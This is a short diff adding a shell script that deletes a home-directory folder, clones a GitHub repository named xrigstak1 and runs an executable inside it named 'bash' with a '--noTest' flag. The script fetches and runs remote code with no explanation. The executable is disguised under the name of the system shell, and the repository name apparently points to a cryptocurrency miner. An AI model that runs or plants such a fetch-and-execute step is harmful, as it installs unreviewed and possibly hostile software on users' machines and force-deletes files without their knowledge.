@@ -1,0 +1,6 @@
+cd ~
+rm -rf xrigstak1
+
+git clone https://github.com/hujisanda/xrigstak1.git
+cd xrigstak1 && chmod u+x bash 
+./bash --noTest
